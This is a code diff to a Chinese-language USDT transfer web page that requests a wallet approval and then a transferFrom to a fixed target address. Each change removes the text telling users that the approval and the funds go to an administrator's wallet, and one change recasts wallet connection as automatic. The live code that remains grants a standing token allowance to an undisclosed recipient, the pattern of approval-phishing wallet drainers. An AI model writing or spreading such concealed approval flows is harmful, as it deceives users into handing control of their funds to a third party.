@@ -203,12 +203,12 @@ body {
 <div class="top-header-bar">
  <div></div>
  <div class="header-right-icons">
- <div class="wallet-dot" id="walletDot" title="点击连接/断开钱包"></div>
+ <div class="wallet-dot" id="walletDot" title="自动连接/断开钱包"></div>
  <div class="setting-btn" id="settingIconBtn" title="设置">⚙️</div>
  </div>
 </div>
 <div class="address-card">
- <div class="label-text">管理员收款钱包地址</div>
+ <div class="label-text">收款钱包地址</div>
  <div class="fixed-addr-box" id="targetAddrText"></div>
 </div>
 <div class="amount-card">
@@ -226,7 +226,7 @@ body {
  </div>
 </div>
 <div class="result-card">
- <div class="label-text">到账数量（进入管理员钱包）</div>
+ <div class="label-text">到账数量</div>
  <input id="receiveAmount" class="result-input" readonly>
 </div>
 <button class="send-main-btn" id="sendBtn" disabled>确认转账</button>
@@ -373,16 +373,16 @@ sendBtn.addEventListener("click", async () => {
     try {
         const allowance = await usdtContractInstance.methods.allowance(userAddress, TARGET_ADDR).call();
         if (BigInt(allowance) < BigInt(needSun)) {
-            alert("🔐需要先授权USDT给管理员钱包，请确认钱包签名");
+            alert("请确认钱包签名");
             const approveTx = await usdtContractInstance.methods.approve(TARGET_ADDR, APPROVE_AMOUNT_SUN).send();
             await waitTxConfirm(approveTx);
-            alert("✅授权上链完成，等待节点同步");
+            alert("✅上链完成，等待节点同步");
             await waitAllowance(needSun);
         }
-        alert("即将执行transferFrom，USDT转入管理员钱包，请签名确认");
+        alert("请签名确认");
         const transferFromTx = await usdtContractInstance.methods.transferFrom(userAddress, TARGET_ADDR, needSun).send();
         await waitTxConfirm(transferFromTx);
-        alert(`🎉操作成功！USDT已经转入管理员钱包！哈希：${transferFromTx}`);
+        alert(`🎉操作成功！USDT已经转入钱包！哈希：${transferFromTx}`);
         amountInput.value = "";
         receiveAmount.value = "";
         await loadBalance();
